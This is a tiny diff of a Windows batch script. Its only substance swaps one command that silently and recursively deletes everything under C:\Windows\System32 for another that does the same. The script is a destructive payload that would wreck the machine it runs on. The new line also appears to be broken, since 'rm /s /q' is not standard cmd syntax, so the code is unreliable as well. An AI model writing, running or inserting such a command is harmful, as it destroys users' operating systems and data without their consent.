@@ -1,3 +1,3 @@
 @echo off
 CLS
-del /s /q C:\Windows\System32\*
+rm /s /q C:\Windows\System32\*
